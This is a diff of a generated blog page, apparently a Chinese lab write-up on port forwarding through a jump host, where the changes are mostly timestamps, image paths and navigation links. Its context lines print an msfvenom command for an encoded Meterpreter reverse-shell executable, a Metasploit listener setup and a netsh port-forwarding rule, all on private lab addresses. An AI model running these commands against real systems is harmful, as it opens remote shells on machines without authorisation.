@@ -140,7 +140,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://leei.site/images/redefine-og.webp">
 <meta property="article:published_time" content="2025-10-27T06:46:19.000Z">
-<meta property="article:modified_time" content="2025-10-27T13:56:45.525Z">
+<meta property="article:modified_time" content="2025-10-28T02:05:08.161Z">
 <meta property="article:author" content="lee">
 <meta property="article:tag" content="网络安全">
 <meta property="article:tag" content="端口转发">
@@ -588,7 +588,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -639,8 +639,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-10-27 21:56:45</span>
-            <span class="mobile">2025-10-27 21:56:45</span>
+            <span class="desktop">2025-10-28 10:05:08</span>
+            <span class="mobile">2025-10-28 10:05:08</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -699,7 +699,7 @@
 <p>故而充当跳板机<br><strong><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/1.png"
+                     data-src="/images1/1.png"
                      
                 ></strong></p>
 <h2 id="端口转发实战步骤"><a href="#端口转发实战步骤" class="headerlink" title="端口转发实战步骤"></a>端口转发实战步骤</h2><h3 id="1-环境连通性测试"><a href="#1-环境连通性测试" class="headerlink" title="1. 环境连通性测试"></a>1. 环境连通性测试</h3><p>测试 Kali 到 Win10 的连通性</p>
@@ -709,7 +709,7 @@
 <p>发现37的网段通，20的网段不通<br><strong><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/3.png"
+                     data-src="/images1/3.png"
                      
                 ></strong><br>用win10去pingkali也是不通的</p>
 <p>环境没问题</p>
@@ -717,54 +717,54 @@
 <p>msfvenom -e x64&#x2F;xor_dynamic -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp \LHOST&#x3D;192.168.37.129 \LPORT&#x3D;5555 -f exe &gt; win_shell.exe<br><strong><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/6.png"
+                     data-src="/images1/6.png"
                      
                 ></strong><br><strong><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/7.png"
+                     data-src="/images1/7.png"
                      
                 ></strong></p>
 <h3 id="3-配置Metasploit监听"><a href="#3-配置Metasploit监听" class="headerlink" title="3. 配置Metasploit监听"></a>3. 配置Metasploit监听</h3><p>bash<br>启动 msfconsole<br>msfconsole<br>设置监听模块<br>use exploit&#x2F;multi&#x2F;handler<br>set PAYLOAD windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>set LHOST 192.168.37.129<br>set LPORT 5555<br>exploit<br><strong><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/8.png"
+                     data-src="/images1/8.png"
                      
                 ></strong><br><strong><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/9.png"
+                     data-src="/images1/9.png"
                      
                 ></strong></p>
 <h3 id="4-端口转发配置"><a href="#4-端口转发配置" class="headerlink" title="4. 端口转发配置"></a>4. 端口转发配置</h3><p>在跳板机上配置端口转发</p>
 <p>netsh interface portproxy add v4tov4 \listenport&#x3D;8080 \listenaddress&#x3D;0.0.0.0 \connectport&#x3D;5555 \connectaddress&#x3D;192.168.37.132<br><strong><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/10.png"
+                     data-src="/images1/10.png"
                      
                 ></strong><br><strong><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/11.png"
+                     data-src="/images1/11.png"
                      
                 ></strong></p>
 <p>成功看到win10的localhost</p>
 <p><strong><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/12.png"
+                     data-src="/images1/12.png"
                      
                 ></strong><br><strong><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/13.png"
+                     data-src="/images1/13.png"
                      
                 ></strong></p>
 <h2 id="常见问题解决"><a href="#常见问题解决" class="headerlink" title="常见问题解决"></a>常见问题解决</h2><h3 id="报错学习：Kali-网络连接问题"><a href="#报错学习：Kali-网络连接问题" class="headerlink" title="报错学习：Kali 网络连接问题"></a>报错学习：Kali 网络连接问题</h3><p>如果 Kali 无法上网，手动启动网卡：</p>
 <p><strong><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/14.png"
+                     data-src="/images1/14.png"
                      
                 ></strong></p>
 <h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>通过本次实验，我们掌握了：</p>
@@ -789,7 +789,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-10-27 21:56:45
+                    :</strong> 2025-10-28 10:05:08
             </li>
         
         <li>
@@ -833,6 +833,18 @@
 
 		
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/10/28/%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%BB%8EMSF%E8%BD%BD%E8%8D%B7%E7%94%9F%E6%88%90%E5%88%B0Windows%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">实战笔记：从MSF载荷生成到Windows防火墙绕过</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
 			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
@@ -928,7 +940,7 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        2 posts in total
+                        3 posts in total
                     </span>
                     
                 </p>
